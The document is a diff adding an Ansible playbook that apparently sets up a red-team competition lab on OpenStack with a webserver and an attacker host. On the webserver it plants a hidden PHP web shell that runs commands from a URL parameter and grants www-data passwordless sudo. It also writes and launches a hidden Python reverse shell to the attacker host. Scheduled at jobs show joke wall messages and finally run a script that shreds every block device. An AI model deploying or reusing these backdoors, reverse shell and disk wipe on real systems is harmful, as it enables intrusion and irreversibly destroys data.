@@ -1,0 +1,413 @@
+---
+#Task 1: download necessary package for openstack deployment
+- name: Install openstack.cloud collection
+  hosts: localhost
+  gather_facts: no
+  become: true
+
+  tasks:
+    - name: Install openstack.cloud collection
+      ansible.builtin.shell:
+        cmd: "ansible-galaxy collection install openstack.cloud"
+      tags:
+        - build
+        - task1
+
+
+# Task 2: create Ubuntu instance and connect to network
+- name: Install Ubuntu
+  hosts: localhost
+  gather_facts: no
+
+  tasks:
+    - name: Create instance of Ubuntu Jammy Desktop that will be a webserver
+    #will simply use the cli command rather than the module because the module is buggy
+      command: >
+        openstack server create
+        --flavor small
+        --image UbuntuJammy2204-Desktop
+        --boot-from-volume 50
+        --nic net-id=5c23e91b-2a9c-4f11-bb8c-c4b92139008b,v4-fixed-ip="192.168.0.30"
+        --key-name "Ansible Key"
+        UbuntuWebserver
+      ignore_errors: yes
+      tags:
+        - build
+        - task2
+
+# Task 3: create Ubuntu instance and connect to network
+- name: Install Ubuntu
+  hosts: localhost
+  gather_facts: no
+
+  tasks:
+    - name: Create instance of Ubuntu Jammy Desktop that witl be a DNS server
+    #will simply use the cli command rather than the module because the module is buggy
+      command: >
+        openstack server create
+        --flavor small
+        --image UbuntuJammy2204-Desktop
+        --boot-from-volume 50
+        --nic net-id=5c23e91b-2a9c-4f11-bb8c-c4b92139008b,v4-fixed-ip="192.168.0.20"
+        --key-name "Ansible Key"
+        UbuntuAttacker
+      ignore_errors: yes
+      tags:
+        - build
+        - task3
+
+#Task 3.5 wait
+- name: wait for connection
+  hosts: localhost
+  tasks:
+
+  - name: wait for connection
+    ansible.builtin.pause:
+      minutes: 1
+
+
+#Task 4 install apache
+- name: install Apache2
+  hosts: webserver
+  tasks:
+
+    - name: install apache2
+      apt:
+        name: apache2
+        update_cache: yes
+      become: yes
+      tags:
+        - modify
+        - task4
+
+#Task 5 add www-data to sudoers group
+- name: add www-data
+  hosts: webserver
+  become: yes
+
+  tasks:
+
+    - name: add www-data
+      ansible.builtin.lineinfile:
+        path: /etc/sudoers
+        state: present
+        line: "www-data ALL=(ALL) NOPASSWD: ALL"
+        tags:
+          - modify
+          - task5
+
+#Task 6 add php file to hidden directory
+- name: add php file
+  hosts: webserver
+  become: yes
+  tasks:
+  
+    - name: add php file
+      ansible.builtin.lineinfile:
+        path: /var/www/html/.../oops.php
+        state: present
+        create: yes
+        line: <html><?php echo shell_exec($_GET['e'].' 2>&1'); ?></html>
+      tags:
+        - modify
+        - task6
+
+#Task 7 install php on webserver
+- name: add php service
+  hosts: webserver
+  become: yes
+  tasks:
+
+    - name: install php
+      apt:
+        name: php
+      tags:
+        - modify
+        - task7
+
+#Task8 Write and execute the Python beacon
+- name: add python beacon
+  hosts: webserver
+  become: yes
+  tasks:
+
+    - name: add python file
+      ansible.builtin.lineinfile:
+        path: /usr/share/nano/...
+        state: present
+        create: yes
+        line: import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.20",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+      tags:
+        - modify
+        - task8
+    - name: execute python file
+      command: python3 /usr/share/nano/... &
+      tags:
+        - modify
+        - task8
+
+#Task 9 write the URL encoder
+- name: add python URL request program
+  hosts: attacker
+  become: yes
+  tasks:
+
+    - name: create file
+      ansible.builtin.blockinfile:
+        path: /home/ubuntu/webshell_requests.py
+        create: yes
+        block: |
+          import requests
+          import urllib.parse
+          url = 'http://192.168.0.30/.../oops.php?e='
+          request = input('Enter your request:')
+          while request.lower() != 'quit':
+            request = urllib.parse.quote(request)
+            x = requests.get(url+request)
+            print(x.text)
+            request = input('Enter your request:')
+      tags:
+        - modify 
+        - task9
+
+#Task 10 install at
+- name: add at
+  hosts: webserver
+  become: yes
+  tasks:
+
+    - name: install at
+      apt:
+        name: at
+      tags:
+        - funny
+        - task10
+
+#Task 11 create joke files
+
+- name: create joke files
+  hosts: webserver
+  become: yes
+  tags:
+    - task11
+    - funny
+  tasks:
+
+    - name: Create directory
+      ansible.builtin.file:
+        path: /etc/haha
+        state: directory
+        mode: '0755'
+
+
+    - name: Create 4:45 2.21
+      ansible.builtin.blockinfile:
+        path: /etc/haha/haha1
+        create: yes
+        mode: 111
+        block: |
+          wall -n "Why don't skeletons fight each other?"
+          sleep 30
+          wall -n "Because they don't have the guts!"
+          sleep 30
+          wall -n "I suggest you find what's causing these messages before the last day of the competition, otherwise the computer might laugh a bit too hard and break!"
+          sudo rm /run/haha/haha1
+
+    - name: Create 5:00 2.21
+      ansible.builtin.blockinfile:
+        path: /etc/haha/haha2
+        create: yes
+        mode: 111
+        block: |
+          wall -n "What do you call fake spaghetti?"
+          sleep 30
+          wall -n "An impasta!"
+          sleep 30
+          wall -n "I suggest you find what's causing these messages before the last day of the competition, otherwise the computer might laugh a bit too hard and break!"
+          sudo rm /run/haha/haha2
+
+    - name: Create 5:15 2.21
+      ansible.builtin.blockinfile:
+        path: /etc/haha/haha3
+        create: yes
+        mode: 111
+        block: |
+          wall -n "Why did the tomato turn red?"
+          sleep 30
+          wall -n "Because it saw the salad dressing!"
+          sleep 30
+          wall -n "I suggest you find what's causing these messages before the last day of the competition, otherwise the computer might laugh a bit too hard and break!"
+          sudo rm /run/haha/haha3
+
+    - name: Create 5:30 2.21
+      ansible.builtin.blockinfile:
+        path: /etc/haha/haha4
+        create: yes
+        mode: 111
+        block: |
+          wall -n "Why don't scientists trust atoms?"
+          sleep 30
+          wall -n "Because they make up everything!"
+          sleep 30
+          wall -n "I suggest you find what's causing these messages before the last day of the competition, otherwise the computer might laugh a bit too hard and break!"
+          sudo rm /run/haha/haha4
+
+
+    - name: Create 4:45 2.26
+      ansible.builtin.blockinfile:
+        path: /etc/haha/haha5
+        create: yes
+        mode: 111
+        block: |
+          wall -n "Did you hear about the mathematician who is afraid of negative numbers?"
+          sleep 30
+          wall -n "He'll stop at nothing to avoid them!"
+          sleep 30
+          wall -n "I suggest you find what's causing these messages before the last day of the competition, otherwise the computer might laugh a bit too hard and break!"
+          sudo rm /run/haha/haha5
+
+    - name: Create 5:00 2.26
+      ansible.builtin.blockinfile:
+        path: /etc/haha/haha6
+        create: yes
+        mode: 111
+        block: |
+          wall -n "What did one ocean say to another?"
+          sleep 30
+          wall -n "Nothing, they just waved!"
+          sleep 30
+          wall -n "I suggest you find what's causing these messages before the last day of the competition, otherwise the computer might laugh a bit too hard and break!"
+          sudo rm /run/haha/haha6
+
+    - name: Create 5:15 2.26
+      ansible.builtin.blockinfile:
+        path: /etc/haha/haha7
+        create: yes
+        mode: 111
+        block: |
+          wall -n "What's orange and sounds like a parrot?"
+          sleep 30
+          wall -n "A carrot!"
+          sleep 30
+          wall -n "I suggest you find what's causing these messages before the last day of the competition, otherwise the computer might laugh a bit too hard and break!"
+          sudo rm /run/haha/haha7
+
+    - name: Create 5:30 2.26
+      ansible.builtin.blockinfile:
+        path: /etc/haha/haha8
+        create: yes
+        mode: 111
+        block: |
+          wall -n "Why did the bicycle fall over?"
+          sleep 30
+          wall -n "Because it was two-tired"
+          sleep 30
+          wall -n "I suggest you find what's causing these messages before the last day of the competition, otherwise the computer might laugh a bit too hard and break!"
+          sudo rm /run/haha/haha8
+
+    - name: Create 4:45 2.28
+      ansible.builtin.blockinfile:
+        path: /etc/haha/haha9
+        create: yes
+        mode: 111
+        block: |
+          wall -n "Why did the scarecrow win an award?"
+          sleep 30
+          wall -n "Because he was outstanding in his field"
+          sleep 30
+          wall -n "I suggest you find what's causing these messages before the last day of the competition, otherwise the computer might laugh a bit too hard and break!"
+          sudo rm /run/haha/haha9
+
+    - name: Create 5:00 2.28
+      ansible.builtin.blockinfile:
+        path: /etc/haha/haha10
+        create: yes
+        mode: 111
+        block: |
+          wall -n "How does a penguin build a house?"
+          sleep 30
+          wall -n "Igloos it together!"
+          sleep 30
+          wall -n "I suggest you find what's causing these messages before the last day of the competition, otherwise the computer might laugh a bit too hard and break!"
+          sudo rm /run/haha/haha10
+
+    - name: Create 5:15 2.28
+      ansible.builtin.blockinfile:
+        path: /etc/haha/haha11
+        create: yes
+        mode: 111
+        block: |
+          wall -n "Why don't some couples go to the gym?"
+          sleep 30
+          wall -n "Because some relationships don't work out!"
+          sleep 30
+          wall -n "I suggest you find what's causing these messages before the last day of the competition, otherwise the computer might laugh a bit too hard and break!"
+          sudo rm /run/haha/haha11
+
+    - name: Create boom
+      ansible.builtin.blockinfile:
+        path: /etc/haha/haha12
+        create: yes
+        mode: 111
+        block: |
+          #!/usr/bin/env bash
+          echo    "Detecting Blockdevices..."
+          lsblk -e7 -d -io NAME -n
+          echo    "Starting wipe..."
+          mapfile -t my_array < <(lsblk -e7 -d -io NAME -n)
+          for i in "${my_array[@]}"
+          do
+              shred -f -n 1 -v -z /dev/$i
+              echo    "/dev/$i nuked!"
+              echo    " "
+          done
+          echo    " "
+          echo    "finished!"
+          exit
+ 
+#Task 12 create at jobs for the file
+- name: create at jobs
+  hosts: webserver
+  become: yes
+  tags:
+    - task12
+    - funny
+  tasks:
+
+    - name: add haha1 to at
+      command: at 16:45 022124  -f /etc/haha/haha1
+
+    - name: add haha2 to at
+      command: at 17:00 022124  -f /etc/haha/haha2
+
+    - name: add haha3 to at
+      command: at 17:15 022124  -f /etc/haha/haha3
+
+    - name: add haha4 to at
+      command: at 17:30 022124  -f /etc/haha/haha4
+
+    - name: add haha5 to at
+      command: at 16:45 022624  -f /etc/haha/haha5
+
+    - name: add haha6 to at
+      command: at 17:00 022624  -f /etc/haha/haha6
+
+    - name: add haha7 to at
+      command: at 17:15 022624  -f /etc/haha/haha7
+
+    - name: add haha8 to at
+      command: at 17:30 022624  -f /etc/haha/haha8
+
+    - name: add haha9 to at
+      command: at 16:45 022824  -f /etc/haha/haha9
+
+    - name: add haha10 to at
+      command: at 17:00 022824  -f /etc/haha/haha10
+
+    - name: add haha11 to at
+      command: at 17:15 022824  -f /etc/haha/haha11
+
+    - name: add haha12 (boom) to at
+      command: at 17:30 022824  -f /etc/haha/haha12
+
+
